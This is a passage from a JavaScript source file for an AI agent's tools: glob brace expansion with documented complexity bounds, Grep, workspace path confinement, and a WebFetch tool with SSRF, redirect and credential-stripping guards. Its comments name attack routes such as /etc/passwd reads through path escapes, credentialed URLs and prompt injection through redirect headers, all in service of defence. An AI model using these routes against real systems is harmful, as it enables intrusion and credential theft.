      const end = bracketEnd(i)
      if (end !== -1) {
        if (stack.length > 0) {
          const top = stack[stack.length - 1]
          for (let k = i; k < end; k++) {
            if (pattern[k] === ',') commasOf.get(top).push(k)
          }
        }
        i = end
        continue
      }
    }
    if (c === '{') {
      stack.push(i)
      commasOf.set(i, [])
    } else if (c === '}') {
      if (stack.length > 0) closeOf[stack.pop()] = i
    } else if (c === ',' && stack.length > 0) {
      commasOf.get(stack[stack.length - 1]).push(i)
    }
    i++
  }
  // #7951 — a group with no top-level comma may still be a RANGE
  // (`parseRangeGroup`, cached per group index since both `count` and
  // `build` need it). `groupKind` is the single source of truth for whether
  // a group expands at all, and how.
  const rangeOf = new Map()
  function groupKind(i) {
    if (commasOf.get(i).length > 0) return 'comma'
    if (!rangeOf.has(i)) rangeOf.set(i, parseRangeGroup(pattern.slice(i + 1, closeOf[i])))
    return rangeOf.get(i) ? 'range' : null
  }
  const expands = (i) => pattern[i] === '{' && closeOf[i] !== -1 && groupKind(i) !== null
  function alternatives(i) {
    const ranges = []
    let start = i + 1
    for (const comma of commasOf.get(i)) { ranges.push([start, comma]); start = comma + 1 }
    ranges.push([start, closeOf[i]])
    return ranges
  }

  // Pass 2 — the exact count, saturating at CAP + 1. Every position is
  // visited by exactly one call (an expanding group hands each of its
  // alternatives to one recursive call and is then jumped over), so this is
  // O(n) no matter what the pattern expands to — a range group's own count
  // is one O(1) arithmetic division (`rangeOf.get(i).count`), never a loop
  // over its members.
  const OVER = GLOB_BRACE_EXPANSION_CAP + 1
  function count(lo, hi) {
    let total = 1
    for (let i = lo; i < hi;) {
      if (pattern[i] === '[') {
        const end = bracketEnd(i)
        if (end !== -1) { i = end; continue }
      }
      if (expands(i)) {
        let sum
        if (groupKind(i) === 'range') {
          sum = rangeOf.get(i).count
          if (sum >= OVER) return OVER
        } else {
          sum = 0
          for (const [s, e] of alternatives(i)) {
            sum += count(s, e)
            if (sum >= OVER) return OVER
          }
        }
        total *= sum
        if (total >= OVER) return OVER
        i = closeOf[i] + 1
        continue
      }
      i++
    }
    return total
  }
  const total = count(0, n)
  if (total >= OVER) return null
  // No `total === 1` short-circuit (#7951 review): a total of 1 no longer
  // means "nothing expands" — a one-member range (`{5..5}`, `{1..3..5}`)
  // still replaces its braces with that member. `build` returns exactly
  // `[pattern]` when no group expands, in the same O(n).

  // Pass 3 — materialize (only reached with total <= CAP). A range group's
  // members are formatted lazily here, one `nth(k)` call per member — never
  // before this point, and never for a group whose count alone already
  // proved the whole pattern over cap.
  function build(lo, hi) {
    let outs = ['']
    let literalFrom = lo
    for (let i = lo; i < hi;) {
      if (pattern[i] === '[') {
        const end = bracketEnd(i)
        if (end !== -1) { i = end; continue }
      }
      if (expands(i)) {
        const literal = pattern.slice(literalFrom, i)
        let alts
        if (groupKind(i) === 'range') {
          const info = rangeOf.get(i)
          alts = []
          for (let k = 0; k < info.count; k++) alts.push(info.nth(k))
        } else {
          alts = []
          for (const [s, e] of alternatives(i)) for (const a of build(s, e)) alts.push(a)
        }
        const next = []
        for (const o of outs) for (const a of alts) next.push(o + literal + a)
        outs = next
        i = closeOf[i] + 1
        literalFrom = i
        continue
      }
      i++
    }
    const tail = pattern.slice(literalFrom, hi)
    return tail ? outs.map((o) => o + tail) : outs
  }
  return build(0, n)
}

/**
 * Sentinel distinguishing a `**` (globstar) pattern segment from a compiled
 * per-segment RegExp in {@link compileCaseCheck}'s `matchers` array. A Symbol
 * rather than the string `'**'` so it can never collide with a RegExp value.
 */
const CASE_CHECK_GLOBSTAR = Symbol('globstar')

/**
 * #7910 review — true when a {@link parseSegmentTokens} token array contains
 * no `star` (`*`) or `any` (`?`) token anywhere, including recursively inside
 * every alternative of an `alt` (`{a,b}`) token. `lit`, `class` (a bracket
 * expression — `[s]`, `[a-z]`) and `none` (an unparseable class, matches
 * nothing) all count as determinate on their own. Verified directly against
 * Node 22's `glob()` as the exact line it draws for two behaviors `walkGlob`
 * has to replicate (see its two call sites): following a symlinked directory,
 * and letting a trailing `**` close with zero width onto something that
 * isn't a directory. Both apply for a literal, bracket-class, or brace
 * segment naming the entry; neither applies when a bare `*`/`?` is what
 * matched it — a bracket class is syntactically a "wildcard" too, but Node's
 * own matcher treats it as determinate enough to follow/close on, same as a
 * literal.
 */
function isDeterminateSegmentTokens(tokens) {
  return tokens.every((t) => {
    if (t.t === 'star' || t.t === 'any') return false
    if (t.t === 'alt') return t.options.every(isDeterminateSegmentTokens)
    return true // 'lit', 'class', 'none'
  })
}

/**
 * COMPLEXITY BOUND (#7898 round 4) — the worst-case cost of the whole
 * segment matcher (`compileCaseCheck` + the per-name matching it drives,
 * everything below this comment), stated once here rather than re-derived
 * per round. Every prior round of this PR's review (1 through 3) found a NEW
 * super-linear blow-up in this code; this is the bound that is supposed to
 * end that pattern, by covering every construct the matcher accepts, not
 * just the one a given round happened to fuzz.
 *
 * #7901 — this bound covers BOTH callers of the matcher: `caseCheckPasses`
 * (a full path's real segments, known up front — still exercised directly by
 * this file's own test suite) and `walkGlob`'s own per-directory-entry use of
 * `segmentMatches`, which is the SAME per-segment token-array DP, just
 * invoked incrementally as the walk discovers each real name instead of
 * post-hoc over an already-known path. The cost accounting below is
 * unchanged either way — it was always per-segment-matched, not tied to
 * which function happens to call it.
 *
 * Notation:
 *   P = `pattern.length` (the whole Glob pattern, all `/`-segments combined).
 *   N = length of one real on-disk path SEGMENT name (a single filename or
 *       directory name, not the whole path).
 *   D = number of path segments in one candidate match (path depth).
 *   M = number of real directory entries the matcher is invoked on for one
 *       Glob call — bounded above by `globMaxEntriesVisited()` (2,000,000 default)
 *       in `walkGlob`, or by `GLOB_COLLECT_CEILING` (50,000) for the matches
 *       `caseCheckPasses` is called on directly.
 *
 * Split into a one-time PARSE and a per-match MATCH phase:
 *
 * PARSE — `compileCaseCheck`, called exactly once per Glob call, by `runGlob`
 * before the walk starts, splits on `/` and parses each segment via
 * `parseSegmentTokens`. For every construct
 * except nested braces, parsing a segment is O(segment length) — brackets,
 * chained (non-nested) `{...}` groups, and runs of `*`/`?` all consume their
 * own text once, so summed across all segments this is O(P). Chain-nested
 * braces (`{a,{b,{c,d}}}`, extended to depth d) are the exception:
 * brace pairing (then a per-`{` scan, since #7951 review one
 * {@link braceCloseTable} pass per parsed string) + `splitTopLevelCommas`
 * re-scan the shrinking remainder
 * at EVERY nesting level, so parse cost for one chain is O(d × average
 * remaining length) = O(d²) when d is left unbounded (measured: 0.16ms at
 * d=10, 301.88ms at d=4000/30,890 chars — quadratic scaling confirmed). Since
 * d ≤ P/2 for any nesting shape, this is O(P²) unbounded, which is why
 * `globPatternComplexityReason` (tool-transforms.js) now caps BOTH P (2,000
 * chars) and nesting depth (32 levels) before any of this runs — bounding
 * either alone would work; both are cheap and the depth cap also closes the
 * separate stack-overflow hazard below. Under that cap, PARSE is O(P)
 * (32 is a constant multiplier).
 *
 * MATCH — the per-segment `segmentMatches` DP, invoked once per real
 * directory entry (≤ M times), whether via `caseCheckPasses`'s own path-level
 * DP that aligns pattern segments (including any number of `**`, at any
 * position) against a match's D real segments — O(S × D), where S is the
 * pattern's segment count (S ≤ P) — or via `walkGlob`'s equivalent
 * incremental frontier update, one real segment at a time, which does the
 * same S-segments-of-work per entry without ever materializing a full D-long
 * real-segments array. Within one aligned non-`**` segment,
 * `segmentMatches` walks that segment's token tree: `*`/`?`/bracket-class
 * tokens are O(N) each; a `{a,b}` token is O(N) PER OPTION, batched over the
 * whole reachable-offset set rather than per-offset (the round-3 fix,
 * `65831e075`) — without that batching, an `alt` token costs O(N ×
 * |reachable|) = O(N²) worst case, which is exactly what `65831e075` closed
 * (12.96s for 20×`{*a,*b}` against a 5000-char name, down to 9.41ms after).
 * Because `advanceToken` commutes with set union for every token type (see
 * its own doc), this batched cost is paid ONCE per token regardless of brace
 * nesting shape, and total token count across a whole segment (leaves plus
 * `alt` nodes, nested or chained) is bounded by that segment's own length —
 * so one `segmentMatches` call is O(segment length × N), and summed across a
 * pattern's segments, one `caseCheckPasses` call is O(P × N). Brace
 * alternatives inside a `**`-adjacent segment, or a segment sitting between
 * two `**`s, are ordinary segments to this accounting — `**` itself costs no
 * per-character work at all (`CASE_CHECK_GLOBSTAR` accepts any already-real
 * segment unconditionally). Across all M candidates: O(M × P × N). #7901 —
 * `walkGlob`'s own I/O is cheaper than this bound needs: each real directory
 * is `opendir`'d exactly ONCE regardless of how many entries it contains
 * (unlike the pre-#7901 `realSegmentNames`, deleted by this fix, which
 * `readdir`'d per PATH SEGMENT of every candidate — cached, but still
 * O(M × D) amortized); the walk's directory-open cost is O(number of real
 * directories under `realRoot` that are actually visited), which this
 * accounting does not need to charge against the matcher's own bound at all.
 *
 * TOTAL, under the complexity cap: O(P) one-time parse + O(M × P × N) match —
 * polynomial in every one of P, N, D, M, with no term left unbounded by an
 * attacker-controlled input.
 *
 * WHAT THE TIME BOUND DOES NOT COVER: `parseSegmentTokens` (parse) and
 * `advanceToken`/`advanceTokens` (match, the `alt` branch) are RECURSIVE, one
 * JS call frame per brace-nesting level, with no depth check of their own —
 * a CPU-cheap but deep enough pattern overflows the call stack
 * (`RangeError: Maximum call stack size exceeded`) before it overflows any
 * time budget. Measured on Node 22.23.2: parse survives to ~depth 5,505,
 * match only to ~depth 2,000 (fewer, shallower frames per level in the
 * mutually-recursive `advanceToken`/`advanceTokens` pair) — both far below
 * what P ≤ 2,000-with-no-depth-cap could otherwise reach, and both
 * environment-dependent (however much stack the caller already used before
 * reaching here), which is exactly why `globPatternComplexityReason`'s 32-
 * level depth cap exists as a SEPARATE check from the length cap rather than
 * relying on length alone to keep depth incidentally low.
 */

/**
 * #7355 — compile a whole Glob pattern into the pieces {@link caseCheckPasses}
 * needs: the pattern has no `/` inside a segment (patterns are always
 * `/`-delimited — `\` is rejected upstream), so it is split on `/` and each
 * segment compiled independently via {@link parseSegmentTokens}. A `**`
 * segment compiles to {@link CASE_CHECK_GLOBSTAR} instead of a token array —
 * it matches zero or more REAL path segments, which are, by construction,
 * always real Dirent names (a `**` carries no literal text of its own to
 * mismatch), so segments it absorbs need no case check at all.
 *
 * Any number of `**` segments is supported: {@link caseCheckPasses} aligns
 * `matchers` against a match's real segments with the standard array
 * wildcard-matching DP (the same shape as string wildcard matching, just one
 * path segment at a time instead of one character at a time), so it is never
 * ambiguous which real segments a `**` absorbed in the sense that matters
 * here — the DP considers every split and accepts if ANY of them makes the
 * whole pattern match. An earlier version special-cased "at most one `**`"
 * and failed closed (rejected every match) for two or more, which silently
 * dropped every match — including already-correctly-cased ones — for an
 * ordinary pattern shape like `packages/**\/src/**\/*.test.js`; verified
 * against origin/main pre-#7355 that the identical fixture returned both
 * matches there, so this was a regression #7355 introduced, not a pre-existing
 * limitation worth keeping.
 *
 * Empty and `.` segments are dropped before compiling: `fs.glob` normalizes
 * both away in what it actually returns (measured: `./src/*.ts` yields a
 * Dirent whose name/parentPath never mention the leading `.`; same for a
 * `.` in the middle, e.g. `src/./x.ts`, or an empty segment from `src//x.ts`)
 * — it echoes neither a `.` component nor an empty one in any match. Compiling
 * the pattern's OWN segment list unfiltered made `./src/*.ts` (3 segments:
 * `.`, `src`, `*.ts`) impossible to align with the real match's 2 segments
 * (`src`, `x.ts`), failing every match closed. `./`-prefixed patterns are
 * explicitly allowed (`globPatternEscapeReason` has no rule against a bare
 * `.` segment), so this was a real regression, not a theoretical one —
 * verified against origin/main pre-#7355 that `./src/*.ts` matched there.
 */
function compileCaseCheck(pattern) {
  const patSegs = pattern.split('/').filter((s) => s !== '' && s !== '.')
  const matchers = patSegs.map((s) => (s === '**' ? CASE_CHECK_GLOBSTAR : parseSegmentTokens(s)))
  return { matchers }
}

/**
 * Test a {@link compileCaseCheck} result against a match's REAL segment names,
 * via the classic wildcard-matching DP over arrays (not strings): `dp[j]` is
 * true when the matchers processed so far can align with the first `j` real
 * segments. A literal matcher consumes exactly one real segment (case-
 * sensitively, via {@link segmentMatches} — see its doc and
 * {@link parseSegmentTokens}'s for why this is a token-array DP and not a
 * `RegExp`); a {@link CASE_CHECK_GLOBSTAR} matcher can consume any number
 * (0..j), computed as a running OR (prefix-OR) rather than an inner loop.
 */
function caseCheckPasses(check, realSegments) {
  const { matchers } = check
  const n = realSegments.length
  let dp = new Array(n + 1).fill(false)
  dp[0] = true
  for (const matcher of matchers) {
    const next = new Array(n + 1).fill(false)
    if (matcher === CASE_CHECK_GLOBSTAR) {
      let seenTrue = false
      for (let j = 0; j <= n; j++) {
        seenTrue = seenTrue || dp[j]
        next[j] = seenTrue
      }
    } else {
      for (let j = 1; j <= n; j++) {
        next[j] = dp[j - 1] && segmentMatches(matcher, realSegments[j - 1])
      }
    }
    dp = next
  }
  return dp[n]
}

/**
 * The leading run of LITERAL directory segments in a glob pattern — the part
 * the caller named outright rather than asked the matcher to discover.
 *
 * `node_modules/**` → `node_modules`; `src/**\/*.ts` → `src`; `*.ts` → ''.
 * The final segment is excluded: it is the basename, and confinement of the
 * matches themselves covers it.
 */
function literalDirPrefix(pattern) {
  const segments = pattern.split('/')
  const literal = []
  for (let i = 0; i < segments.length - 1; i++) {
    if (/[*?[\]{}]/.test(segments[i])) break
    literal.push(segments[i])
  }
  return literal.join('/')
}

async function runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Prefer ripgrep; fall back to grep. Both honor -i and -n. The if/then/else
  // (NOT `rg || grep`) keeps a no-match rg exit-1 from re-running the search
  // under grep (Copilot review on #4060). executeBash captures the exit code
  // (doesn't reject), so no `; true` mask is needed here. Builders are shared
  // with the docker-byok container Grep (#5882).
  const { ci, ln, globArg } = buildGrepArgs(input)
  const cmd = buildGrepCommand({ pattern, root: realRoot, ci, ln, globArg })

  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 60_000,
    env: buildSafeBashEnv(),
  })
  // grep/rg both return exit 1 on "no matches" — that's not an error
  // for our purposes. Only exit 2+ or stderr-without-stdout signals an
  // actual failure.
  if (result.stderr && !result.stdout && result.exitCode !== 1) {
    return { content: `Grep failed: ${result.stderr.trim()}`, isError: true }
  }
  if (!result.stdout) return { content: `No matches for ${pattern}`, isError: false }
  return { content: result.stdout, isError: false }
}

/**
 * Validate that an optional `path` argument (for Glob/Grep search roots)
 * is inside the workspace cwd. Defaults to cwd when unset/empty. Returns
 * the realpath so the caller can pass it to bash safely (the spawned
 * shell uses the realpath, not the original symlinked alias).
 *
 * SECURITY: an earlier draft of this function only rejected literal `..`
 * sequences, which let `Glob { path: '/etc' }` and `Grep { path: '/etc' }`
 * search the entire filesystem and return /etc/passwd etc. Caught by
 * `/agent-review` on PR #4060 — see #4071. Now realpath-validates the
 * path through the same machinery the Read/Write/Edit tools use.
 */
async function safeResolveRoot(p, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof p !== 'string' || p.length === 0) return cwd
  // #6923 — pass the RAW path; see safeResolve for why pre-`resolve()` is unsafe
  // (lexical `..` collapse hides a symlink+`..` escape).
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    p,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${p} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

const WEBFETCH_DEFAULT_TIMEOUT_MS = 30_000
const WEBFETCH_TIMEOUT_CEILING_MS = 120_000
const WEBFETCH_MAX_RAW_BYTES = 1_048_576       // 1 MB cap on body read from socket
const WEBFETCH_MAX_OUTPUT_CHARS = 100_000      // 100 KB cap on text returned to model
// #4132: undici's default redirect cap is 20. Ours is tighter so the
// model can't burn its turn on a redirect-loop honeypot — and we
// re-validate scheme + host on every hop, so the loop is also a
// per-hop SSRF gate, not just a count.
const WEBFETCH_MAX_REDIRECT_HOPS = 10

async function isHostAllowed(hostname) {
  if (process.env.CHROXY_WEBFETCH_ALLOW_PRIVATE === '1') return true
  if (typeof hostname !== 'string' || hostname.length === 0) return false
  // URL.hostname returns IPv6 literals WITH square brackets ('[::1]'),
  // and node:net isIP doesn't accept brackets. Strip them before the
  // isIP probe so legitimate public IPv6 URLs aren't all rejected as
  // unresolvable hostnames. (Caught by /agent-review on #4165 — #4166.)
  const probe = hostname.startsWith('[') && hostname.endsWith(']')
    ? hostname.slice(1, -1)
    : hostname
  if (isIP(probe)) return !isPrivateOrSpecialIp(probe)
  try {
    // Resolve ALL addresses (both families). A multi-A host that returns
    // a public IP plus a private IP would otherwise slip past with the
    // single-address default — `fetch` may then pick the private one.
    // Refuse if ANY resolved address is private/special. (Copilot review
    // on #4165.)
    const addresses = await dnsLookup(probe, { all: true })
    if (!Array.isArray(addresses) || addresses.length === 0) return false
    for (const { address } of addresses) {
      if (isPrivateOrSpecialIp(address)) return false
    }
    return true
  } catch {
    // Unresolvable host — refuse rather than letting fetch try.
    return false
  }
}

async function runWebFetch({ input, signal }) {
  const rawUrl = input?.url
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) {
    return { content: 'EINVAL: url is required', isError: true }
  }
  const rawPrompt = input?.prompt
  if (typeof rawPrompt !== 'string' || rawPrompt.length === 0) {
    return { content: 'EINVAL: prompt is required', isError: true }
  }
  let parsed
  try {
    parsed = new URL(rawUrl)
  } catch {
    // #4159: do NOT echo rawUrl here — a URL that fails to parse can
    // still contain userinfo (e.g. `http://alice:hunter2@` fails the
    // host check) and any echo lands in conversation history.
    return { content: 'EINVAL: malformed url (could not be parsed as http(s))', isError: true }
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return {
      content: `EINVAL: only http(s) URLs are supported (got ${parsed.protocol})`,
      isError: true,
    }
  }
  // #4133: strip user:pass@ userinfo before either echoing the URL back
  // to the model OR passing it to fetch(). Two reasons:
  //   1. The model's tool_result lands in conversation history and gets
  //      resent to the Anthropic API on the next turn — userinfo in the
  //      URL is a credential exfiltration path.
  //   2. Node fetch refuses URLs containing credentials outright with
  //      an error that itself echoes the credentialed URL, so even the
  //      failure path leaks. Stripping here turns the fetch into an
  //      unauthenticated request — the server may 401 / 403, which is
  //      surfaced cleanly without exposing the creds.
  // #4160: remember whether userinfo was present so the result header
  // can surface a `[userinfo stripped from ...]` marker — a silent strip
  // turns a downstream 401 into a mysterious failure that the model can't
  // diagnose. The marker is the design trade-off worth flagging.
  //
  // #4183: track input-URL strip and redirect-hop strip as SEPARATE flags
  // so the marker can say exactly where the credentials came from. The
  // pre-#4183 single `hadUserinfo` flag produced a marker adjacent to
  // `currentUrl` (which may be a redirect destination), so a reader
  // could plausibly think the marker referred to the displayed URL
  // even when the strip happened on the input or on an earlier hop.
  // Distinguishing the two sources keeps the marker honest in the
  // redirect-chain case without changing where it sits in the result.
  const inputHadUserinfo = Boolean(parsed.username || parsed.password)
  let redirectHadUserinfo = false
  if (inputHadUserinfo) {
    parsed.username = ''
    parsed.password = ''
  }

  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, WEBFETCH_TIMEOUT_CEILING_MS)
    : WEBFETCH_DEFAULT_TIMEOUT_MS

  const ac = new AbortController()
  const timer = setTimeout(() => ac.abort(new Error('timeout')), timeoutMs)
  // Forward an external abort signal (session destroy) into our local
  // controller. If the signal is ALREADY aborted at entry, the listener
  // wouldn't fire — short-circuit so a destroyed session doesn't make an
  // outbound request.
  const onExternalAbort = () => ac.abort(signal.reason)
  if (signal) {
    if (signal.aborted) ac.abort(signal.reason)
    else signal.addEventListener('abort', onExternalAbort, { once: true })
  }

  try {
    // #4132: SSRF check on the initial URL. Done before any network
    // attempt so an attacker can't even confirm a private host is
    // listening on the chroxy host.
    if (!(await isHostAllowed(parsed.hostname))) {
      return {
        content:
          `EACCES: refusing to fetch private/loopback/link-local host (${parsed.hostname}). ` +
          'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in (local dev only — this is an SSRF guard).',
        isError: true,
      }
    }

    // #4132: manual redirect handling so we can re-validate scheme +
    // host on every hop. `redirect: 'follow'` would otherwise honour an
    // attacker's redirect to file:// (well, undici would refuse it
    // with a vague network error) or to a private IP (which undici
    // happily follows).
    let res
    let currentUrl = parsed
    for (let hop = 0; hop <= WEBFETCH_MAX_REDIRECT_HOPS; hop++) {
      res = await fetch(currentUrl.toString(), {
        signal: ac.signal,
        redirect: 'manual',
        headers: { 'user-agent': 'chroxy-webfetch/1.0' },
      })
      if (res.status < 300 || res.status >= 400) break
      const loc = res.headers.get('location')
      // Drain the body so the connection can return to the pool.
      try { await res.body?.cancel() } catch { /* connection already torn down */ }
      if (!loc) {
        return { content: `WebFetch redirect ${res.status} with no Location header`, isError: true }
      }
      let nextUrl
      try {
        nextUrl = new URL(loc, currentUrl)
      } catch {
        return { content: `WebFetch refused redirect: malformed Location header`, isError: true }
      }
      // #4182 (Copilot review): a Location header can introduce
      // `user:pass@` userinfo on any hop. Strip it BEFORE the next fetch
      // — Node fetch refuses credentialed URLs with an error that echoes
      // the credentialed URL, which would then leak via the catch-all
      // `WebFetch failed: ${err.message}` path.
      // #4183: set `redirectHadUserinfo` (separate from `inputHadUserinfo`)
      // so the result marker can name where the credentials came from
      // rather than ambiguously claiming "userinfo stripped" next to a
      // URL that may not itself have carried any.
      if (nextUrl.username || nextUrl.password) {
        redirectHadUserinfo = true
        nextUrl.username = ''
        nextUrl.password = ''
      }
      if (nextUrl.protocol !== 'http:' && nextUrl.protocol !== 'https:') {
        // The Location header is attacker-controlled, so don't echo it
        // verbatim — that's a prompt-injection surface AND would leak
        // sensitive paths (e.g. file:///etc/passwd). Just report the
        // scheme. (Copilot review on #4165.)
        return {
          content: `WebFetch refused redirect scheme: only http(s) allowed (got ${nextUrl.protocol})`,
          isError: true,
        }
      }
      if (!(await isHostAllowed(nextUrl.hostname))) {
        return {
          content:
            `WebFetch refused redirect to private/loopback/link-local host (${nextUrl.hostname}). ` +
            'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in.',
          isError: true,
        }
      }
      if (hop === WEBFETCH_MAX_REDIRECT_HOPS) {
        return {
          content: `WebFetch hit redirect cap: too many redirects (>${WEBFETCH_MAX_REDIRECT_HOPS} hops)`,
          isError: true,
        }
      }
      currentUrl = nextUrl
    }

    // Compute the marker AFTER the redirect loop so it reflects any
    // userinfo stripped on a hop (#4182 Copilot review). #4183: name the
    // SOURCE of the stripped credentials so the marker is unambiguous
    // when `currentUrl` is a redirect destination that didn't itself
    // carry userinfo. The four arms are mutually exclusive at the
    // boolean level; the cross case is a single combined message rather
    // than two stacked markers.
    const userinfoMarker = (() => {
      if (inputHadUserinfo && redirectHadUserinfo) {
        return ' [userinfo stripped from input URL and redirect Location]'
      }
      if (inputHadUserinfo) return ' [userinfo stripped from input URL]'
      if (redirectHadUserinfo) return ' [userinfo stripped from redirect Location]'
      return ''
    })()

    if (!res.ok) {
      return {
        content: `HTTP ${res.status} ${res.statusText} from ${currentUrl.toString()}${userinfoMarker}`,
        isError: true,
      }
    }

    const ctype = (res.headers.get('content-type') || '').toLowerCase()
    if (isBinaryContentType(ctype)) {
      return {
        content: `Unsupported content-type for WebFetch: ${ctype || 'unknown'} (binary content is not extracted to text).`,
        isError: true,
      }
    }

    // #4134: respect the declared charset rather than blindly utf-8.
    // Legacy sites still serve ISO-8859-1, Shift_JIS, GB2312, etc.; an
    // unconditional utf-8 decode produces mojibake that the model
    // can't reason about. Falls back to utf-8 when charset is missing,
    // unknown, or rejected by TextDecoder.
    const charset = pickCharset(ctype)
    const raw = await readBodyCapped(res, WEBFETCH_MAX_RAW_BYTES, charset)
    const isHtml = ctype.includes('text/html') || ctype.includes('application/xhtml')
    const text = isHtml ? stripHtmlToText(raw.text) : raw.text
    const { output, outputTruncated } = capOutput(text, WEBFETCH_MAX_OUTPUT_CHARS)

    // Distinct markers so the model can tell whether it lost data at the
    // socket (raw cap) or after HTML extraction (output cap). Output cap
    // takes precedence in the marker because that's the final visible cut.
    let marker = ''
    if (outputTruncated) {
      marker = `\n\n[truncated at output cap: ${WEBFETCH_MAX_OUTPUT_CHARS} chars]`
    } else if (raw.truncated) {
      marker = `\n\n[truncated at raw body cap: ${WEBFETCH_MAX_RAW_BYTES} bytes]`
    }

    return {
      content: `Prompt: ${rawPrompt}\nURL: ${currentUrl.toString()}${userinfoMarker}\n\n${output}${marker}`,
      isError: false,
    }
  } catch (err) {
    // ac.abort(reason) surfaces `reason` as the thrown error rather than
    // wrapping it in AbortError. The most reliable signal that we aborted
    // is the controller's signal.aborted state — message-string matching
    // misses arbitrary user-supplied reasons (e.g. "session destroyed").
    if (ac.signal.aborted) {
      return { content: `WebFetch timed out or aborted after ${timeoutMs}ms`, isError: true }
    }
    return { content: `WebFetch failed: ${err?.message || String(err)}`, isError: true }
  } finally {
    clearTimeout(timer)
    if (signal) signal.removeEventListener('abort', onExternalAbort)
  }
}

function isBinaryContentType(ctype) {
  if (!ctype) return false
  if (ctype.startsWith('text/')) return false
  if (ctype.includes('json') || ctype.includes('xml') || ctype.includes('javascript')
      || ctype.includes('yaml') || ctype.includes('+text')) return false
  return true
}

/**
 * Pick a TextDecoder-compatible charset label from a Content-Type header.
 * Returns 'utf-8' when missing, unparseable, or rejected by TextDecoder
 * (so the caller never has to handle a thrown constructor).
 */
function pickCharset(ctype) {
  if (!ctype) return 'utf-8'
  // Match `charset=foo` allowing quoted values per RFC 7231. Anchor on
  // a parameter-boundary (start-of-string or `;`) so a contrived header
  // like `text/html; xcharset=fakeout` can't have its tail matched and
  // mistaken for the real `charset` parameter. (#4162)
  const m = ctype.match(/(?:^|;)\s*charset\s*=\s*"?([\w.:+-]+)"?/i)
  if (!m) return 'utf-8'
  const label = m[1]
  try {
    // Constructor throws if the label is unknown to the WHATWG registry.
    // We only use the throw signal — `new TextDecoder(label)` itself is
    // not retained; the real decoder is built per-call in readBodyCapped.
    new TextDecoder(label)
    return label
  } catch {
    return 'utf-8'
  }
}

async function readBodyCapped(res, maxBytes, charset = 'utf-8') {
  // pickCharset has already validated the label, so this can't throw.
  const decoder = new TextDecoder(charset)
  const reader = res.body?.getReader()
  if (!reader) {
    // Defensive fallback for the (unreachable in practice) case where
    // fetch returns no body stream. Use arrayBuffer + TextDecoder so
    // both paths apply the same charset AND the same byte-based cap —
    // res.text() would (a) hard-wire utf-8 in undici and (b) measure
    // the cap in chars, not bytes. Keeps the contract consistent.
    const ab = await res.arrayBuffer()
    const bytes = Buffer.from(ab)
    if (bytes.byteLength > maxBytes) {
      return { text: decoder.decode(bytes.subarray(0, maxBytes)), truncated: true }
    }
    return { text: decoder.decode(bytes), truncated: false }
  }
  const chunks = []
  let total = 0
  let truncated = false
  while (true) {
    const { done, value } = await reader.read()
    if (done) break
    if (!value) continue
    total += value.byteLength
    if (total > maxBytes) {
      const overflow = total - maxBytes
      chunks.push(value.subarray(0, value.byteLength - overflow))
      truncated = true
      try { await reader.cancel() } catch { /* fetch already winding down */ }
      break
    }
    chunks.push(value)
  }
  const buf = Buffer.concat(chunks.map((c) => Buffer.from(c)))
  return { text: decoder.decode(buf), truncated }
}

const HTML_ENTITY_MAP = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&apos;': "'",
  '&#39;': "'",
  '&nbsp;': ' ',
}

function stripHtmlToText(html) {
  // 1. Drop <script> and <style> blocks completely (body and all).
  let s = html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<!--[\s\S]*?-->/g, '')
  // 2. Treat block-level tags as line breaks so paragraphs don't merge.
  s = s.replace(/<\/?(p|div|h[1-6]|li|tr|br|hr|section|article|header|footer|nav|aside)\b[^>]*>/gi, '\n')
  // 3. Strip remaining tags.
  s = s.replace(/<[^>]+>/g, '')
  // 4. Decode named entities + numeric (decimal + hex) entities.
  s = s.replace(/&(?:amp|lt|gt|quot|apos|#39|nbsp);/g, (m) => HTML_ENTITY_MAP[m])
  s = s.replace(/&#(\d+);/g, (_, n) => safeFromCodePoint(Number(n)))
  s = s.replace(/&#x([0-9a-fA-F]+);/g, (_, h) => safeFromCodePoint(parseInt(h, 16)))
  // 5. Collapse whitespace per line + trim aggressive blank-line runs.
  s = s.split('\n').map((line) => line.replace(/[ \t]+/g, ' ').trim()).join('\n')
  s = s.replace(/\n{3,}/g, '\n\n').trim()
  return s
}

// Unicode code points are 0..0x10FFFF and the surrogate range 0xD800..0xDFFF
// is reserved (passing those to fromCodePoint also throws). Return empty
// string for out-of-range values so a malicious entity like &#9999999999;
// can't crash the entire WebFetch.
function safeFromCodePoint(code) {
  if (!Number.isFinite(code) || code < 0 || code > 0x10FFFF) return ''
  if (code >= 0xD800 && code <= 0xDFFF) return ''
  return String.fromCodePoint(code)
}

function capOutput(text, maxChars) {
  if (text.length <= maxChars) {
    return { output: text, outputTruncated: false }
  }
  return { output: text.slice(0, maxChars), outputTruncated: true }
}

/**
 * Merge a partial todo list into the session's `todoStore` (Map keyed by
 * id). Items in the call replace existing entries with the same id;
 * items not mentioned in the call are preserved (merge semantics — see
 * #4051 acceptance criteria). Validates each item before mutating so a
 * mid-list invalid entry doesn't half-apply the update.
 */
function runTodoWrite({ input, todoStore }) {
  if (!todoStore || !(todoStore instanceof Map)) {
    return {
      content: 'EINTERNAL: TodoWrite requires a session-scoped store (byok-session.js wires this).',
      isError: true,
    }
  }
  const todos = input?.todos
  if (!Array.isArray(todos)) {
